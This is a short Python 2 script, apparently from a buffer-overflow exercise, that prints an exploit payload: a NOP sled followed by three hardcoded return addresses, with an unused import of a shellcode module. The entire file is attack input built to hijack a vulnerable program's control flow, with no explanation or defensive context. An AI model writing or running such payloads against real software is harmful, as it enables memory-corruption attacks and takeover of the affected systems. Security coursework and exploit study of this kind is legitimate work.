#!/usr/bin/python

from shellcode import shellcode 
from struct import pack
print "\x90"*22+ pack("<I", 0x804ef50)+  pack("<I", 0x804ef50)+ pack("<I", 0x80bc8e0)

